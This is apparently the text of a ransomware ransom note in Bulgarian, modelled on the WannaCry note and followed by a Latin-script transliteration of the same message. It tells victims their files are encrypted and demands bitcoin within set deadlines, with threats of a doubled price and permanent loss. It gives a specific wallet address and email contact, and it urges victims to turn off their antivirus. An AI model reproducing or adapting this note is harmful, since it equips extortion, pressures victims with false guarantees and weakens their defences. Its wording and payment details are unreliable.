Оооо! Вашите файлове са шифровани!

Какво се случи с моя компютър?
Вашите важни файлове са криптирани.
Много от вашите документи, снимки, видеоклипове, бази данни и други файлове вече не са достъпни, защото са криптирани. Може би сте заети да търсите начин да възстановите филмите си, но не си губете времето. Никой не може да възстанови вашите файлове без нашата услуга за дешифриране.

Мога ли да възстановя файловете си?
Сигурен. Ние гарантираме, че можете да възстановите всичките си файлове безопасно и лесно. Но нямате достатъчно време.
Ако искате да дешифрирате всичките си файлове, трябва да платите.
Имате само 3 дни, за да изпратите плащането. След това цената ще бъде двойна.
Освен това, ако не платите до 7 дни, няма да можете да възстановите файловете си завинаги.
Ще имаме безплатни събития за потребители, които са толкова бедни, че не могат да платят за 6 месеца.

Как да платя?
Плащането се приема само в биткойн. За повече отидете в браузъра си и потърсете („За биткойн“)
Моля, проверете текущата цена на биткойн и купете малко биткойни. За повече информация отидете в браузъра си и потърсете („Как да купя биткойни“).
И изпратете правилната сума на това („адрес биткойни/биткойн портфейл: bc1qtd4qv0wmgtu2rdr0wr8tka2jg44cgmz04z5mc7“)
След като платите, моля, изпратете ми имейл: nguyenvietphat.n@gmail.com. Най-доброто време за имейл е
19:00 - 23:00 (UTC+7) от събота и неделя.
След като плащането бъде проверено, можете незабавно да започнете да дешифрирате вашите файлове.

Контакт
Ако имате нужда от вашата помощ, изпратете съобщение до нас, като ни изпратите имейл: nguyenvietphat.n@gmail.com.

Силно ви препоръчваме да не премахвате този софтуер и да деактивирате антивирусната си програма за известно време, докато не платите и плащането не бъде обработено. Ако вашата антивирусна програма се актуализира и премахне този софтуер автоматично, тя няма да може да възстанови вашите файлове дори и да платите!
Oooo! Vashite faĭlove sa shifrovani!

Kakvo se sluchi s moya kompyutŭr?
Vashite vazhni faĭlove sa kriptirani.
Mnogo ot vashite dokumenti, snimki, videoklipove, bazi danni i drugi faĭlove veche ne sa dostŭpni, zashtoto sa kriptirani. Mozhe bi ste zaeti da tŭrsite nachin da vŭzstanovite filmite si, no ne si gubete vremeto. Nikoĭ ne mozhe da vŭzstanovi vashite faĭlove bez nashata usluga za deshifrirane.

Moga li da vŭzstanovya faĭlovete si?
Siguren. Nie garantirame, che mozhete da vŭzstanovite vsichkite si faĭlove bezopasno i lesno. No nyamate dostatŭchno vreme.
Ako iskate da deshifrirate vsichkite si faĭlove, tryabva da platite.
Imate samo 3 dni, za da izpratite plashtaneto. Sled tova tsenata shte bŭde dvoĭna.
Osven tova, ako ne platite do 7 dni, nyama da mozhete da vŭzstanovite faĭlovete si zavinagi.
Shte imame bezplatni sŭbitiya za potrebiteli, koito sa tolkova bedni, che ne mogat da platyat za 6 mesetsa.

Kak da platya?
Plashtaneto se priema samo v bitkoĭn. Za poveche otidete v brauzŭra si i potŭrsete („Za bitkoĭn“)
Molya, proverete tekushtata tsena na bitkoĭn i kupete malko bitkoĭni. Za poveche informatsiya otidete v brauzŭra si i potŭrsete („Kak da kupya bitkoĭni“).
I izpratete pravilnata suma na tova („adres bitkoĭni/bitkoĭn portfeĭl: bc1qtd4qv0wmgtu2rdr0wr8tka2jg44cgmz04z5mc7“)
Sled kato platite, molya, izpratete mi imeĭl: nguyenvietphat.n@gmail.com. Naĭ-dobroto vreme za imeĭl e
19:00 - 23:00 (UTC+7) ot sŭbota i nedelya.
Sled kato plashtaneto bŭde provereno, mozhete nezabavno da zapochnete da deshifrirate vashite faĭlove.

Kontakt
Ako imate nuzhda ot vashata pomosht, izpratete sŭobshtenie do nas, kato ni izpratite imeĭl: nguyenvietphat.n@gmail.com.

Silno vi preporŭchvame da ne premakhvate tozi softuer i da deaktivirate antivirusnata si programa za izvestno vreme, dokato ne platite i plashtaneto ne bŭde obraboteno. Ako vashata antivirusna programa se aktualizira i premakhne tozi softuer avtomatichno, tya nyama da mozhe da vŭzstanovi vashite faĭlove dori i da platite!